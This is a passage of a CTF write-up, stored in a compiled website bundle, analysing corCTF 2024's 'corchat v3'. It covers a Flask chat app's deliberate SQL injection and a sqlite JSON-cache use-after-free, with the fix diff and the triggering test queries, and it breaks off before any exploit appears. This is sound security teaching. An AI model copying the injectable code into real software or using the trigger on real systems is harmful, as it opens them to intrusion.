"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[1509],{2551:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>r,default:()=>d,frontMatter:()=>c,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"ctf-writeups/corctf-2024/corchat-v3","title":"corchat v3","description":"","source":"@site/pwn/ctf-writeups/corctf-2024/corchat-v3.md","sourceDirName":"ctf-writeups/corctf-2024","slug":"/ctf-writeups/corctf-2024/corchat-v3","permalink":"/pwn/ctf-writeups/corctf-2024/corchat-v3","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"description":"","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"format-string","permalink":"/pwn/ctf-writeups/corctf-2024/format-string"},"next":{"title":"diceCTF 2025","permalink":"/pwn/category/dicectf-2025"}}');var i=n(4848),a=n(8453);const c={description:"",sidebar_position:2},r="corchat v3",o={},l=[{value:"Introduction",id:"introduction",level:2},{value:"Reversing",id:"reversing",level:2},{value:"SQL injection",id:"sql-injection",level:3},{value:"Where&#39;s the pwn?",id:"wheres-the-pwn",level:3},{value:"sqlite3 and JSON",id:"sqlite3-and-json",level:2},{value:"json_set",id:"json_set",level:3},{value:"struct JsonParse",id:"struct-jsonparse",level:3},{value:"jsonParseCached",id:"jsonparsecached",level:3},{value:"jsonReplaceNode",id:"jsonreplacenode",level:3},{value:"The UAF",id:"the-uaf",level:2},{value:"So what now?",id:"so-what-now",level:3},{value:"Data Spraying",id:"data-spraying",level:3},{value:"Smashing tcache",id:"smashing-tcache",level:3},{value:"Write what where",id:"write-what-where",level:3},{value:"One gadgets in python?",id:"one-gadgets-in-python",level:3},{value:"Overwriting a class method",id:"overwriting-a-class-method",level:3},{value:"More crashes",id:"more-crashes",level:3},{value:"Solution",id:"solution",level:2}];function h(e){const s={a:"a",admonition:"admonition",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"corchat-v3",children:"corchat v3"})}),"\n",(0,i.jsx)(s.h2,{id:"introduction",children:"Introduction"}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (156).png",alt:""}),(0,i.jsx)("figcaption",{})]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"corchat v3"})," was one of the (many) brainfuck pwn challenges from this CTF, and was the challenge I focused on during the event (gotta get that $50). Unfortunately I didn't solve it during the event, and someone beat me to it anyways. I did however manage to figure out most of how it worked after the event (with some reference to the author's solution). Anways, let's jump in."]}),"\n",(0,i.jsx)(s.h2,{id:"reversing",children:"Reversing"}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/corchat.gif",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"The application"})})]}),"\n",(0,i.jsx)(s.p,{children:"As the name implies, the target is a chatting application, which we're given the following source code for:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-python",children:'from flask import Flask, request, g, render_template, redirect\nfrom flask_socketio import SocketIO\nimport sqlite3\n\napp = Flask(__name__)\nsocketio = SocketIO(app)\napp.config["DATABASE"] = "chat.db"\n\ndef get_db():\n    db = getattr(g, \'_database\', None)\n    if db is None:\n        db = g._database = sqlite3.connect(app.config[\'DATABASE\'])\n    return db\n\n@app.teardown_appcontext\ndef close_connection(exception):\n    db = getattr(g, \'_database\', None)\n    if db is not None:\n        db.close()\n\n@app.route("/")\ndef index():\n    return redirect("/chatroom")\n\n@app.route("/chatroom", methods=["GET"])\ndef chatroom():\n    return render_template("chatroom.html")\n\n@app.route("/send_message", methods=["POST"])\ndef post_new_message():\n    message = request.form.get("msg")\n    if message == None or len(message) == 0:\n        return "Invalid request"\n\n    db = get_db()\n    s = f"INSERT INTO messages (message) VALUES (\'{message}\')"\n    db.cursor().execute(s)\n    db.commit()\n\n    data = {"msg": message}\n    socketio.emit("recv_message", data)\n    return "Success"\n\n@socketio.on("connect")\ndef handle_new_connection():\n    cursor = get_db().cursor()\n    s = f"SELECT message FROM messages"\n    cursor.execute(s)\n\n    messages = cursor.fetchall()\n    for message in messages:\n        data = {"msg": message[0]}\n        socketio.emit("recv_message", data, to=request.sid)\n\n@socketio.on("new_message")\ndef handle_new_message(data):\n    message = data["msg"]\n    if message == None or len(message) == 0:\n        return\n\n    db = get_db()\n    s = f"INSERT INTO messages (message) VALUES (\'{message}\')"\n    db.cursor().execute(s)\n    db.commit()\n\n    socketio.emit("recv_message", data)\n\nif __name__ == "__main__":\n    socketio.run(app, host="0.0.0.0", port=5000, debug=False)\n'})}),"\n",(0,i.jsx)(s.p,{children:"The app is fairly simple:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["A user can send a message (handled by ",(0,i.jsx)(s.code,{children:"handle_new_message"}),"), which is stored to a sqlite database using an ",(0,i.jsx)(s.code,{children:"INSERT"})," statement."]}),"\n",(0,i.jsxs)(s.li,{children:["A user connecting to the server (handled by ",(0,i.jsx)(s.code,{children:"handle_new_connection"}),") will receive all the messages currently in the database."]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"sql-injection",children:"SQL injection"}),"\n",(0,i.jsx)(s.p,{children:"The first vulnerability is fairly easy to spot:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-python",children:"s = f\"INSERT INTO messages (message) VALUES ('{message}')\"\ndb.cursor().execute(s)\n"})}),"\n",(0,i.jsx)(s.p,{children:"When inserting the message into the database, it's inserted directly into the statement using string formatting, instead of something like prepared statements, without checking the contents of the message or escaping problematic characters. This is a classic SQL injection."}),"\n",(0,i.jsx)(s.p,{children:"Unfortunately we can't use it for an RCE in this case, and it's not like the flag (or anything useful) is in the database. So what on earth is this useful for?"}),"\n",(0,i.jsx)(s.h3,{id:"wheres-the-pwn",children:"Where's the pwn?"}),"\n",(0,i.jsx)(s.p,{children:"The app is written in python, so it's not like the app itself can have any memory corruption bugs either, so what gives? Isn't this meant to be a pwn challenge???"}),"\n",(0,i.jsxs)(s.p,{children:["Well upon closer inspection of the ",(0,i.jsx)(s.code,{children:"Dockerfile"}),", we notice something interesting."]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-docker",children:"RUN git clone https://github.com/sqlite/sqlite && \\\n    cd sqlite && \\\n    git checkout 66dacae4c3f818d0a9e94ecb4433c823a69a98aa && \\\n    ./configure && \\\n    make && \\\n    cp .libs/libsqlite3.so.0.8.6 /usr/lib/x86_64-linux-gnu/\n"})}),"\n",(0,i.jsxs)(s.p,{children:["While most of the installs are normal, this one stands out, because it's compiling its own ",(0,i.jsx)(s.em,{children:"very specific"})," version of ",(0,i.jsx)(s.code,{children:"libsqlite3"})," using a commit hash. So, what if there was a vulnerability in this version of ",(0,i.jsx)(s.code,{children:"libsqlite3"}),"? Well the python library wouldn't be implementing all the logic itself, it would instead reuse existing code, which would come from libraries like ",(0,i.jsx)(s.code,{children:"libsqlite3"}),", so a vulnerability here would also be a vulnerability in python's ",(0,i.jsx)(s.code,{children:"sqlite3"}),", thus our application. And since we have SQL injection, we can pass arbitary SQL commands, so we'd have a decent amount of control in this hypothetical attack scenario."]}),"\n",(0,i.jsxs)(s.p,{children:["Let's first look at this ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/commit/66dacae4c3f818d0a9e94ecb4433c823a69a98aa",children:"commit"}),":"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"git clone https://github.com/sqlite/sqlite\ncd sqlite\ngit checkout 66dacae4c3f818d0a9e94ecb4433c823a69a98aa\ngit log\n"})}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (132).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("code",{children:"git log"})})})]}),"\n",(0,i.jsx)(s.p,{children:"Having a brief look at the current commit didn't ring any alarm bells. But what if there was a vulnerability that was reported and fixed in a later commit. Well scrolling up to the next commit reveals something very appealing:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"git log --reverse --all --ancestry-path ^HEAD\n"})}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (161).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:"Next commit"})})]}),"\n",(0,i.jsxs)(s.p,{children:["A potential UAF you say ","\ud83d\udc40",". Commit ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/commit/faef28e6bd654e5061561423cb1ece6ca84f1f1f",children:"faef28e6bd654e5061561423cb1ece6ca84f1f1f"})," includes a patch for the issue:"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-diff",children:"@@ -2902,6 +2902,7 @@ static void jsonReplaceFunc(\n   }\n   pParse = jsonParseCached(ctx, argv[0], ctx, argc>1);\n   if( pParse==0 ) return;\n+  pParse->nJPRef++;\n   for(i=1; i<(u32)argc; i+=2){\n     zPath = (const char*)sqlite3_value_text(argv[i]);\n     pParse->useMod = 1;\n@@ -2914,6 +2915,7 @@ static void jsonReplaceFunc(\n   jsonReturnJson(pParse, pParse->aNode, ctx, 1);\n replace_err:\n   jsonDebugPrintParse(pParse);\n+  jsonParseFree(pParse);\n }\n \n \n@@ -2948,6 +2950,7 @@ static void jsonSetFunc(\n   }\n   pParse = jsonParseCached(ctx, argv[0], ctx, argc>1);\n   if( pParse==0 ) return;\n+  pParse->nJPRef++;\n   for(i=1; i<(u32)argc; i+=2){\n     zPath = (const char*)sqlite3_value_text(argv[i]);\n     bApnd = 0;\n@@ -2964,9 +2967,8 @@ static void jsonSetFunc(\n   }\n   jsonDebugPrintParse(pParse);\n   jsonReturnJson(pParse, pParse->aNode, ctx, 1);\n-\n jsonSetDone:\n-  /* no cleanup required */;\n+  jsonParseFree(pParse);\n }\n"})}),"\n",(0,i.jsxs)(s.p,{children:["At first glance, one can assume that there's a UAF occuring due to the ",(0,i.jsx)(s.code,{children:"pParse"})," object's reference count not being incremented, causing it to be incorrectly freed. But what is this talk about a JSON parser cache spill?"]}),"\n",(0,i.jsx)(s.p,{children:"We've also been given some test cases which would supposedly trigger the bug:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-sql",children:"# 2023-10-09 https://sqlite.org/forum/forumpost/b25edc1d46\n# UAF due to JSON cache overflow\n#\ndo_execsql_test json101-22.1 {\n  SELECT json_set(\n    '{}',\n    '$.a', json('1'),\n    '$.a', json('2'),\n    '$.b', json('3'),\n    '$.b', json('4'),\n    '$.c', json('5'),\n    '$.c', json('6')\n  );\n} {{{\"a\":2,\"b\":4,\"c\":6}}}\ndo_execsql_test json101-22.2 {\n  SELECT json_replace(\n    '{\"a\":7,\"b\":8,\"c\":9}',\n    '$.a', json('1'),\n    '$.a', json('2'),\n    '$.b', json('3'),\n    '$.b', json('4'),\n    '$.c', json('5'),\n    '$.c', json('6')\n  );\n} {{{\"a\":2,\"b\":4,\"c\":6}}}\n"})}),"\n",(0,i.jsx)(s.p,{children:"Let's try them out in the docker."}),"\n",(0,i.jsxs)("div",{children:[(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (162).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"json_set"})," test"]})})]})," ",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (163).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsxs)("p",{children:[(0,i.jsx)("code",{children:"json_replace"})," test"]})})]})]}),"\n",(0,i.jsx)(s.p,{children:"And that right there, is the pwn we've been looking for."}),"\n",(0,i.jsx)(s.h2,{id:"sqlite3-and-json",children:"sqlite3 and JSON"}),"\n",(0,i.jsxs)(s.p,{children:["So at the moment we know there's a UAF in the ",(0,i.jsx)(s.code,{children:"json_set"})," and ",(0,i.jsx)(s.code,{children:"json_replace"})," functions, but what are ",(0,i.jsx)(s.a,{href:"https://www.sqlite.org/json1.html#jset",children:"these functions"}),"?"]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"json_set"})," takes a json object and key-value pairs, and assigns each pair to the json object (",(0,i.jsx)(s.code,{children:"json[key] = value]"}),")."]}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"json_replace"})," is similar, but only sets the value if the key ",(0,i.jsx)(s.em,{children:"exists"})," in the object."]}),"\n",(0,i.jsx)(s.p,{children:"From what I could see, there doesn't seem to be a proper JSON object type in sqlite, rather they take and return strings representing JSON objects, which you can see in the test cases as well. This means they need to parse the JSON string every time it's used."}),"\n",(0,i.jsxs)(s.p,{children:["For this writeup we'll focus on ",(0,i.jsx)(s.code,{children:"json_set"}),", but note that you could most likely also do this challenge using ",(0,i.jsx)(s.code,{children:"json_replace"})," (or ",(0,i.jsx)(s.code,{children:"json_insert"}),")."]}),"\n",(0,i.jsx)(s.h3,{id:"json_set",children:"json_set"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"json_set"})," is implemented with ",(0,i.jsx)(s.code,{children:"jsonSetFunc"})," (bet you didn't see that coming)."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (164).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2932",children:"jsonSetFunc"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["We see that a function called ",(0,i.jsx)(s.code,{children:"jsonParseCached"})," is used to generate the ",(0,i.jsx)(s.code,{children:"pParse"})," object we saw earlier which, based on the name, we can assume would parse the JSON string, but also keeps a cache to speed up parsing, which makes sense as a JSON string would have to be parsed each time one was used. Also the bug description described a cache spill/overflow, so I wonder if this has anything to do with it. Foreshadowing is a literary device in wh-"]}),"\n",(0,i.jsx)(s.p,{children:"After parsing the JSON it pretty much does what you'd expect:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["Lookup the key to get the value ",(0,i.jsx)(s.code,{children:"pNode"})," (if it doesn't exist a null slot is allocated by ",(0,i.jsx)(s.code,{children:"jsonLookup"}),")."]}),"\n",(0,i.jsxs)(s.li,{children:["The value ",(0,i.jsx)(s.code,{children:"pNode"})," is replaced by the new value with ",(0,i.jsx)(s.code,{children:"jsonReplaceNode"}),"."]}),"\n"]}),"\n",(0,i.jsx)(s.admonition,{type:"info",children:(0,i.jsxs)(s.p,{children:["You may have also noticed the ",(0,i.jsx)(s.code,{children:'bIsSet ? "set : "insert"'}),", which is because this function can also implement ",(0,i.jsx)(s.code,{children:"json_insert"}),". We don't need to worry about the extra logic that this brings as we don't use it here."]})}),"\n",(0,i.jsx)(s.h3,{id:"struct-jsonparse",children:"struct JsonParse"}),"\n",(0,i.jsxs)(s.p,{children:["Ths is the type of the object ",(0,i.jsx)(s.code,{children:"pParse"}),", which represents a ",(0,i.jsx)(s.strong,{children:"parsing"})," of the JSON string, not a typical JSON object you might be picturing which has a list of key-value pairs or a hash table. Think of it more like an AST (Abstract Syntax Tree)."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (169).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L192",children:"struct jsonParse"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["It stores the JSON string that the parse came from and a list of nodes in ",(0,i.jsx)(s.code,{children:"aNode"}),", which can have multiple ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L113",children:"types"}),":"]}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:["OBJECT/ARRAY: These refer to ",(0,i.jsx)(s.code,{children:"{}"}),"/",(0,i.jsx)(s.code,{children:"[]"})," respectively, and store the total number of nodes contained in the object/array, which directly follow this object."]}),"\n",(0,i.jsx)(s.li,{children:"STRING/INT/REAL: These contain pointers into the main JSON string referring to the string/int/real, plus the length."}),"\n",(0,i.jsxs)(s.li,{children:["NULL: Represents a ",(0,i.jsx)(s.code,{children:"null"}),"."]}),"\n"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (170).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L154",children:"struct JsonNode"})})})]}),"\n",(0,i.jsx)(s.h3,{id:"jsonparsecached",children:"jsonParseCached"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.code,{children:"jsonParseCached"})," is a bit confusing at first, because there's a lot of logic relating to caching that we don't need to worry about ",(0,i.jsx)(s.em,{children:"too"})," much (particularly regarding whether the JSON is allowed prior edits), so I'll just cover the essentials."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (168).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1884",children:"jsonParseCached"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["Since an sqlite object is passed, we need to extract the raw ",(0,i.jsx)(s.code,{children:"char*"})," in ",(0,i.jsx)(s.code,{children:"zJson"})," and the size in ",(0,i.jsx)(s.code,{children:"nJson"}),"."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (171).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1900",children:"jsonParseCached"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["Then it iterates through all the possible entries in the JSON parser cache. sqlite stores these in a singly linked list along with other auxillary data allocations (accessed by ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/vdbeapi.c#L1038",children:"sqlite3_get_auxdata"}),"). Since they're lumped in with other types of allocations, they're uniquely identified by giving them a set of keys that are only used by JSON parse objects, starting at ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1853",children:"JSON_CACHE_ID"}),", and containing ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1854",children:"JSON_CACHE_SZ"})," (4) keys."]}),"\n",(0,i.jsxs)(s.p,{children:["If a slot is missing, it's marked using ",(0,i.jsx)(s.code,{children:"iMinKey"}),", which is used later as the slot to store a new ",(0,i.jsx)(s.code,{children:"JsonParse"})," object."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (176).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1925",children:"jsonParseCached"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["A slot can also be marked using ",(0,i.jsx)(s.code,{children:"iMinKey"})," if it's been in the cache too long. This is implemented using numbers representing the ",(0,i.jsx)(s.code,{children:"iHold"})," of an object. The object with the lowest ",(0,i.jsx)(s.code,{children:"iHold"})," will be removed, and new objects are marked with the highest ",(0,i.jsx)(s.code,{children:"iHold"})," out of the currently cached items."]}),"\n",(0,i.jsx)(s.p,{children:"It's easier to think of it like a FIFO queue: An object is inserted into the cache, and as more objects are inserted, the original one is pushed to the end, where it's eventually dequeued to make room for the next one."}),"\n",(0,i.jsxs)(s.p,{children:["A JSON string is matched to cache entry typically by comparing the JSON strings using ",(0,i.jsx)(s.code,{children:"memcmp"}),". There is more logic relating to this, but it's not that important for our purposes here."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (174).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1942",children:"jsonParseCached"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["Above is how a new ",(0,i.jsx)(s.code,{children:"JsonParse"})," object is created if a cached one couldn't be found. While most of this isn't too important, there are some details which are interesting to note:"]}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Line 1959: The reference count is set to 1."}),"\n",(0,i.jsxs)(s.li,{children:["Line 1963: This is a case where ",(0,i.jsx)(s.code,{children:"jsonParse"})," failed, and there's a comment that the caller will own the new ",(0,i.jsx)(s.code,{children:"JsonParse"})," object. If that's what happens in the case of an error, what happens normally?"]}),"\n",(0,i.jsxs)(s.li,{children:["Line 1971: Well see that it's actually the ",(0,i.jsx)(s.em,{children:"cache"})," that owns the object, ",(0,i.jsx)(s.em,{children:"not"})," the caller. Hmmm..."]}),"\n",(0,i.jsxs)(s.li,{children:["Line 1972: The object is stored to the cache using ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/vdbeapi.c#L1066",children:"sqlite3_set_auxdata"}),", at ",(0,i.jsx)(s.code,{children:"iMinKey"}),", with the destructor ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L673",children:"jsonParseFree"}),". If it's replacing an entry that already exists, then the existing entry is freed using its destructor."]}),"\n"]}),"\n",(0,i.jsx)(s.p,{children:"The destructor in question behaves how you might expect:"}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (179).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L673",children:"jsonParseFree"})})})]}),"\n",(0,i.jsx)(s.p,{children:"Decrements the reference count until it's 1, in which case free it."}),"\n",(0,i.jsxs)(s.p,{children:["This idea of the cache owning the object is also elaborated on in a ",(0,i.jsx)(s.a,{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L1868",children:"comment above"}),":"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (180).png",alt:""}),(0,i.jsx)("figcaption",{})]}),"\n",(0,i.jsxs)(s.p,{children:["And if you remember what the patch was, it was ",(0,i.jsx)(s.code,{children:"jsonSetFunc"})," incrementing the reference count themselves, effectively also taking ownership of the object. So clearly something went wrong with this idea, and they seemingly had to backtrack a bit to fix it."]}),"\n",(0,i.jsx)(s.p,{children:"So to summarise:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsxs)(s.li,{children:[(0,i.jsx)(s.code,{children:"JsonParse"})," objects are cached in a queue of size 4."]}),"\n",(0,i.jsx)(s.li,{children:"It will attempt to find a cached entry before making a new one."}),"\n",(0,i.jsx)(s.li,{children:"If one can not be found, a new one will be made."}),"\n",(0,i.jsx)(s.li,{children:"This new one is added to the queue, potentially forcing another existing entry out of the queue, causing it to be freed."}),"\n",(0,i.jsxs)(s.li,{children:["All entries belong to the cache and have a reference count of 1, which are unchanged by ",(0,i.jsx)(s.code,{children:"jsonSetFunc"})," and ",(0,i.jsx)(s.code,{children:"jsonReplaceFunc"}),"."]}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"jsonreplacenode",children:"jsonReplaceNode"}),"\n",(0,i.jsxs)(s.p,{children:["Let's have a closer look at how the value node is replaced in ",(0,i.jsx)(s.code,{children:"json_set"}),". Remember that ",(0,i.jsx)(s.code,{children:"jsonSetFunc"})," uses ",(0,i.jsx)(s.code,{children:"jsonLookup"})," (exact details of how this works aren't important) to find a node for the value corresponding to the key, and if the key doesn't already exist, allocate a NULL node for the value of this new key, and use that."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (181).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2797",children:"jsonReplaceNode"})})})]}),"\n",(0,i.jsx)(s.p,{children:"The way replacing a node works is basically by allocating a SUBST node that references the node to be replaced, but the details of this aren't necessary here. Then there's a switch case depending on the type of the sqlite object, so it can handle each type separately. Let's look at the TEXT case."}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (182).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2838",children:"jsonReplaceNode"})})})]}),"\n",(0,i.jsx)(s.p,{children:"There's a lot going on here, but it really comes down to 2 separate cases:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.code,{children:"sqlite3_value_subtype(pValue) != JSON_SUBTYPE"})}),"\n",(0,i.jsx)(s.li,{children:(0,i.jsx)(s.code,{children:"sqlite3_value_subtype(pValue) == JSON_SUBTYPE"})}),"\n"]}),"\n",(0,i.jsxs)(s.p,{children:["What does it mean for a ",(0,i.jsx)(s.code,{children:"pValue"})," to be have ",(0,i.jsx)(s.code,{children:"JSON_SUBTYPE"}),". Well, while there isn't a JSON object type per se, there ",(0,i.jsx)(s.em,{children:"is"})," a distinction between strings that came from JSON functions like ",(0,i.jsx)(s.code,{children:"json"}),", ",(0,i.jsx)(s.code,{children:"json_set"})," etc. These are marked as having the subtype ",(0,i.jsx)(s.code,{children:"JSON_SUBTYPE"})," by ",(0,i.jsx)(s.code,{children:"jsonReturnJson"}),", which is used by most of the JSON related functions."]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (183).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L832",children:"jsonReturnJson"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["So for example the string ",(0,i.jsx)(s.code,{children:'"hello world"'})," would ",(0,i.jsx)(s.em,{children:"not"})," be considering a JSON subtype, but ",(0,i.jsx)(s.code,{children:'json("hello world")'})," ",(0,i.jsx)(s.em,{children:"would"}),". And if you remember the test cases once again, they used strings in calls to ",(0,i.jsx)(s.code,{children:"json"}),". Why is that important?"]}),"\n",(0,i.jsxs)(s.p,{children:["Well, if we have a closer look at the ",(0,i.jsx)(s.code,{children:"JSON_SUBTYPE"})," case:"]}),"\n",(0,i.jsxs)("figure",{children:[(0,i.jsx)("img",{src:"/assets/image (185).png",alt:""}),(0,i.jsx)("figcaption",{children:(0,i.jsx)("p",{children:(0,i.jsx)("a",{href:"https://github.com/sqlite/sqlite/blob/66dacae4c3f818d0a9e94ecb4433c823a69a98aa/src/json.c#L2857",children:"jsonReplaceNode"})})})]}),"\n",(0,i.jsxs)(s.p,{children:["There's a call to ",(0,i.jsx)(s.code,{children:"jsonParseCached"}),", which would make sense, considering that it expects this to be a JSON string. Harmless, right?"]}),"\n",(0,i.jsx)(s.h2,{id:"the-uaf",children:"The UAF"}),"\n",(0,i.jsxs)(s.p,{children:["Well let's go back to ",(0,i.jsx)(s.code,{children:"jsonParseCached"}),". We know that it either returns a ",(0,i.jsx)(s.code,{children:"JsonParse"})," from the cache, or creates a new one ands adds it to the cache. Either way, a ",(0,i.jsx)(s.code,{children:"JsonParse"})," from ",(0,i.jsx)(s.code,{children:"jsonParseCached"})," will belong to the cache. That would include the original ",(0,i.jsx)(s.code,{children:"JsonParse"})," all the way back in ",(0,i.jsx)(s.code,{children:"jsonSetFunc"}),"."]}),"\n",(0,i.jsxs)(s.p,{children:["We also know that ",(0,i.jsx)(s.code,{children:"jsonParseCached"})," can push old objects out of the cache, causing them to be freed using ",(0,i.jsx)(s.code,{children:"jsonParseFree"}),". This could also include the original ",(0,i.jsx)(s.code,{children:"JsonParse"})," from ",(0,i.jsx)(s.code,{children:"jsonSetFunc"}),"!"]}),"\n",(0,i.jsxs)(s.p,{children:["This on its own isn't a problem, but considering the fact that the object would only belong to the cache, this is ",(0,i.jsx)(s.em,{children:"now"})," a problem, because when it's freed by ",(0,i.jsx)(s.code,{children:"jsonParseFree"}),", it would see that the reference count is 1, so it believes that nothing else is using it (only the cache is), so it's safe to free it!"]}),"\n",(0,i.jsxs)(s.p,{children:["But of course, it 